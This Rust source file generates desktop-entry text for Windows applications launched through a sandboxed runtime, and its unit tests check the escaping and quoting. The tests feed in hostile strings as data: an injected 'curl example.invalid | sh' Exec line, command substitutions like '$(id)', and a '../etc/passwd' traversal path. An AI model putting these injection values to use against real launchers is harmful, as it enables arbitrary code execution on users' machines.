// SPDX-License-Identifier: LicenseRef-TUR-Noncommercial-1.0.0

//! The text of a desktop entry for an installed Windows application.
//!
//! Only the text is produced. Installing it, file associations and icons
//! taken from the program are not built yet.
//!
//! The entry starts the application through `tur-runtime launch`, so the
//! sandbox and the prefix rules apply to a click in the launcher exactly as
//! they do on the command line. `X-TUR-Runtime` and `X-TUR-App-Id` let the
//! desktop tell which runtime an entry belongs to (specification §3.4).
//!
//! Escaping follows the Desktop Entry Specification: string values escape
//! the backslash and the newline, tab and carriage-return characters; an
//! `Exec` argument is enclosed in double quotes with `"`, `` ` ``, `$` and
//! `\` escaped by a backslash, a literal `%` is written `%%`, and the string
//! escaping is applied on top of the quoting.

use crate::metadata::RuntimeKind;
use crate::paths::is_plain_absolute;
use crate::profile::{AppProfile, ProfileRuntime};
use crate::runtime_cmd::PlanError;

/// A desktop entry: the name of its file and its contents.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DesktopEntry {
    /// The file name, such as `tur-wine-com.example.app.desktop`.
    pub file_name: String,
    /// The contents of the file.
    pub contents: String,
}

/// Escapes a value of type string or localestring.
fn escape_value(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for (index, character) in text.chars().enumerate() {
        match character {
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\t' => out.push_str("\\t"),
            '\r' => out.push_str("\\r"),
            // A leading space would be dropped by a reader.
            ' ' if index == 0 => out.push_str("\\s"),
            // No other control character has an escape; none may appear.
            other if other.is_control() => {}
            other => out.push(other),
        }
    }
    out
}

/// One argument of an `Exec` line, quoted, before string escaping.
fn quote_argument(text: &str) -> String {
    let mut out = String::with_capacity(text.len() + 2);
    out.push('"');
    for character in text.chars() {
        match character {
            '"' | '`' | '$' | '\\' => {
                out.push('\\');
                out.push(character);
            }
            '%' => out.push_str("%%"),
            other => out.push(other),
        }
    }
    out.push('"');
    out
}

fn unsupported(reason: &str) -> PlanError {
    PlanError::Unsupported {
        reason: reason.to_owned(),
    }
}

/// Whether `launcher` can be written into an `Exec` line as it is: a program
/// name or an absolute path made of characters that need no quoting.
fn is_plain_launcher(launcher: &str) -> bool {
    !launcher.is_empty()
        && launcher.len() <= 1024
        && (!launcher.contains('/') || is_plain_absolute(launcher))
        && launcher.bytes().all(|byte| {
            byte.is_ascii_alphanumeric() || matches!(byte, b'/' | b'.' | b'_' | b'-' | b'+')
        })
}

/// Writes the desktop entry for `profile`.
///
/// * `profile_path`: where the profile is stored; the entry passes it to
///   `tur-runtime launch`.
/// * `launcher`: the `tur-runtime` program, by name or absolute path.
///
/// # Errors
///
/// [`PlanError::Unsupported`] when the profile's runtime is not one that
/// `tur-runtime launch` starts, or when `profile_path` or `launcher` cannot
/// be written into an entry safely.
pub fn desktop_entry(
    profile: &AppProfile,
    profile_path: &str,
    launcher: &str,
) -> Result<DesktopEntry, PlanError> {
    let runtime = match profile.runtime {
        ProfileRuntime::Wine => RuntimeKind::Wine,
        ProfileRuntime::Proton => RuntimeKind::Proton,
        _ => {
            return Err(unsupported(
                "desktop entries are written for the wine and proton runtimes only",
            ));
        }
    };
    if !is_plain_absolute(profile_path) {
        return Err(unsupported(
            "the profile's own path must be absolute, without \"..\" or control characters",
        ));
    }
    if !is_plain_launcher(launcher) {
        return Err(unsupported(
            "the launcher must be a program name or a plain absolute path",
        ));
    }

    let exec = format!("{launcher} launch {}", quote_argument(profile_path));
    let mut lines = vec![
        "[Desktop Entry]".to_owned(),
        "Version=1.5".to_owned(),
        "Type=Application".to_owned(),
        format!("Name={}", escape_value(&profile.display_name)),
        format!(
            "Comment={}",
            escape_value(&format!("Windows application ({})", runtime.label()))
        ),
        format!("Exec={}", escape_value(&exec)),
        "Icon=application-x-ms-dos-executable".to_owned(),
        "Terminal=false".to_owned(),
        "StartupNotify=true".to_owned(),
        format!("X-TUR-App-Id={}", escape_value(&profile.app_id)),
        format!("X-TUR-Runtime={}", runtime.as_str()),
    ];
    if let Some(prefix_id) = &profile.prefix_id {
        lines.push(format!("X-TUR-Prefix-Id={}", escape_value(prefix_id)));
    }
    let mut contents = lines.join("\n");
    contents.push('\n');
    Ok(DesktopEntry {
        file_name: format!("tur-{}-{}.desktop", runtime.as_str(), profile.app_id),
        contents,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::codes::Code;
    use crate::profile::parse_profile;

    fn profile() -> AppProfile {
        parse_profile(
            r#"{
                "schema_version": 1,
                "app_id": "com.example.app",
                "display_name": "Example Application",
                "binary": "/home/ada/Games/app.exe",
                "format": "pe",
                "architecture": "x86_64",
                "runtime": "wine",
                "prefix_id": "example-app",
                "isolation_profile": "desktop-standard",
                "fallback": "none",
                "test_status": "untested"
            }"#,
        )
        .unwrap()
    }

    /// Reads an entry back the way a desktop would: one key per line, string
    /// escapes undone.
    fn read_back(contents: &str) -> Vec<(String, String)> {
        let mut lines = contents.lines();
        assert_eq!(lines.next(), Some("[Desktop Entry]"));
        lines
            .map(|line| {
                let (key, value) = line.split_once('=').unwrap_or_else(|| panic!("{line:?}"));
                let mut plain = String::new();
                let mut characters = value.chars();
                while let Some(character) = characters.next() {
                    if character != '\\' {
                        plain.push(character);
                        continue;
                    }
                    plain.push(match characters.next() {
                        Some('s') => ' ',
                        Some('n') => '\n',
                        Some('t') => '\t',
                        Some('r') => '\r',
                        Some('\\') => '\\',
                        other => panic!("bad escape {other:?} in {line:?}"),
                    });
                }
                (key.to_owned(), plain)
            })
            .collect()
    }

    /// Splits an `Exec` value into arguments by the specification's quoting
    /// rules, after string escapes have been undone.
    fn split_exec(exec: &str) -> Vec<String> {
        let mut arguments = Vec::new();
        let mut current = String::new();
        let mut quoted = false;
        let mut characters = exec.chars();
        while let Some(character) = characters.next() {
            match character {
                '"' => quoted = !quoted,
                '\\' if quoted => current.push(characters.next().unwrap()),
                '%' => {
                    assert_eq!(characters.next(), Some('%'), "a field code in {exec:?}");
                    current.push('%');
                }
                ' ' if !quoted => arguments.push(std::mem::take(&mut current)),
                '$' | '`' if quoted => panic!("unescaped {character:?} in {exec:?}"),
                other => current.push(other),
            }
        }
        assert!(!quoted, "unbalanced quotes in {exec:?}");
        arguments.push(current);
        arguments
    }

    fn value<'a>(entry: &'a [(String, String)], key: &str) -> &'a str {
        let mut found = entry.iter().filter(|(name, _)| name == key);
        let first = found.next().unwrap_or_else(|| panic!("{key} is missing"));
        assert!(found.next().is_none(), "{key} appears more than once");
        &first.1
    }

    #[test]
    fn an_ordinary_entry() {
        let entry = desktop_entry(
            &profile(),
            "/home/ada/.local/share/tur/profiles/com.example.app.json",
            "tur-runtime",
        )
        .unwrap();
        assert_eq!(entry.file_name, "tur-wine-com.example.app.desktop");
        assert_eq!(
            entry.contents,
            "[Desktop Entry]\n\
             Version=1.5\n\
             Type=Application\n\
             Name=Example Application\n\
             Comment=Windows application (Wine)\n\
             Exec=tur-runtime launch \"/home/ada/.local/share/tur/profiles/com.example.app.json\"\n\
             Icon=application-x-ms-dos-executable\n\
             Terminal=false\n\
             StartupNotify=true\n\
             X-TUR-App-Id=com.example.app\n\
             X-TUR-Runtime=wine\n\
             X-TUR-Prefix-Id=example-app\n"
        );

        let mut proton = profile();
        proton.runtime = ProfileRuntime::Proton;
        let entry = desktop_entry(&proton, "/p/profile.json", "/usr/bin/tur-runtime").unwrap();
        assert_eq!(entry.file_name, "tur-proton-com.example.app.desktop");
        let fields = read_back(&entry.contents);
        assert_eq!(value(&fields, "X-TUR-Runtime"), "proton");
        assert_eq!(value(&fields, "Comment"), "Windows application (Proton)");
        assert_eq!(
            split_exec(value(&fields, "Exec")),
            ["/usr/bin/tur-runtime", "launch", "/p/profile.json"]
        );
    }

    #[test]
    fn hostile_names_cannot_add_keys_or_commands() {
        let names = [
            "Evil\nExec=sh -c 'curl example.invalid | sh'",
            "Evil\r\nTerminal=true",
            "  leading spaces",
            "back\\slash \\n not a newline",
            "100% %f %u \"quoted\" $(id) `id` $HOME",
            "tab\there",
            "bell\u{7}escape\u{1b}[31m",
            "[Desktop Action Evil]",
            "Приложение 应用 🎮",
            "=",
            "",
        ];
        for name in names {
            let mut hostile = profile();
            hostile.display_name = name.to_owned();
            let entry = desktop_entry(&hostile, "/p/profile.json", "tur-runtime").unwrap();

            // Exactly the expected keys, each once, one per line.
            let fields = read_back(&entry.contents);
            let keys: Vec<&str> = fields.iter().map(|(key, _)| key.as_str()).collect();
            assert_eq!(
                keys,
                [
                    "Version",
                    "Type",
                    "Name",
                    "Comment",
                    "Exec",
                    "Icon",
                    "Terminal",
                    "StartupNotify",
                    "X-TUR-App-Id",
                    "X-TUR-Runtime",
                    "X-TUR-Prefix-Id"
                ],
                "{name:?}"
            );
            assert_eq!(entry.contents.lines().count(), 12, "{name:?}");
            assert!(!entry.contents.contains('\r'), "{name:?}");

            // The name reads back as written, less the control characters
            // that have no escape.
            let expected: String = name
                .chars()
                .filter(|c| !c.is_control() || matches!(c, '\n' | '\t' | '\r'))
                .collect();
            assert_eq!(value(&fields, "Name"), expected, "{name:?}");

            // Nothing in the name reaches the command.
            assert_eq!(
                split_exec(value(&fields, "Exec")),
                ["tur-runtime", "launch", "/p/profile.json"],
                "{name:?}"
            );
            assert_eq!(value(&fields, "Terminal"), "false");
        }
    }

    #[test]
    fn hostile_profile_paths_stay_one_argument() {
        let paths = [
            "/home/ada/My Profiles/app one.json",
            "/p/$HOME/`id`/$(id).json",
            "/p/quote\"inside.json",
            "/p/back\\slash.json",
            "/p/100%/%f/%%.json",
            "/p/semi;colon&&amp|pipe>redirect.json",
            "/p/single'quote.json",
            "/p/Приложение.json",
            "/p/trailing space .json",
        ];
        for path in paths {
            let entry = desktop_entry(&profile(), path, "tur-runtime").unwrap();
            let fields = read_back(&entry.contents);
            assert_eq!(
                split_exec(value(&fields, "Exec")),
                ["tur-runtime", "launch", path],
                "{path:?}"
            );
            assert_eq!(entry.contents.lines().count(), 12, "{path:?}");
        }

        // The specification's own examples: a backslash becomes four in the
        // file, and a dollar sign becomes two backslashes and the sign.
        let entry = desktop_entry(&profile(), "/p/a\\b$c.json", "tur-runtime").unwrap();
        assert!(
            entry
                .contents
                .contains("Exec=tur-runtime launch \"/p/a\\\\\\\\b\\\\$c.json\"\n")
        );
    }

    #[test]
    fn what_cannot_be_written_safely_is_refused() {
        for path in ["relative.json", "", "/p/../etc/passwd", "/p/new\nline.json"] {
            let error = desktop_entry(&profile(), path, "tur-runtime").unwrap_err();
            assert_eq!(error.code(), Code::LaunchUnsupported, "{path:?}");
        }
        for launcher in [
            "",
            "tur runtime",
            "sh -c evil;",
            "relative/tur-runtime",
            "/usr/bin/../../tmp/evil",
            "tur-runtime\nExec=evil",
            "$(evil)",
            "\"quoted\"",
            "tur-runtime%f",
        ] {
            let error = desktop_entry(&profile(), "/p/profile.json", launcher).unwrap_err();
            assert_eq!(error.code(), Code::LaunchUnsupported, "{launcher:?}");
        }
        let mut native = profile();
        native.runtime = ProfileRuntime::Native;
        assert!(desktop_entry(&native, "/p/profile.json", "tur-runtime").is_err());
    }

    #[test]
    fn a_profile_without_a_prefix_name_has_no_prefix_key() {
        let mut bare = profile();
        bare.prefix_id = None;
        let entry = desktop_entry(&bare, "/p/profile.json", "tur-runtime").unwrap();
        assert!(!entry.contents.contains("X-TUR-Prefix-Id"));
        assert_eq!(entry.contents.lines().count(), 11);
    }
}
